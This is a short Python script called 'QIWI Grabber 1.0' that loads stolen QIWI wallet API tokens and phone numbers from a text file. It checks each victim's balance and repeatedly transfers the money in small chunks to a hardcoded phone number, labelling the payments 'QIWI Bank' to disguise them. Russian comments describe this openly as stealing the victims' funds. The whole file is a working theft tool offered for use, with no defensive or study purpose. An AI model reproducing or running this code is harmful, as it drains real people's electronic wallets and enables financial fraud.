from SimpleQIWI import *
import time
print("QIWI Grabber 1.0")
token,phone=[],[]
f=open("text.txt", "r")
line=f.read().splitlines()
for i in line:
    token.append(i.split(':')[0])
    phone.append(i.split(':')[1])
f.close()
qiwi="+79659379244"
ind=0
while True:
    for t in token:
        api = QApi(token=t, phone=phone[ind])
        print("Баланс Жертвы:")
        b = api.balance
        g = [1.0] #Сумма после которой у жертвы спишутся деньги. Например 50.0 (50р) если на балансе будет 51р и больше, програма начнет списание денег.
        print(b)
        if b[0] > g[0]:
            while b[0] != g[0]:
                try:
                    api = QApi(token=t, phone=phone[ind])
                    api.pay(account=qiwi, amount=1, comment="QIWI Bank") #В amount= указываем какими частями переводить, например 1 (1руб), тогда программа начнет воровать баланс несколькими транзакциями по одному рублю
                except:
                    print("Недостаточно средств")
                    break    
                print("Списание...")
            print("Все деньги сняты :))")
        time.sleep(3) #Задержка в сек
        if ind <= len(token)-2:
            ind+=1
        else:
            break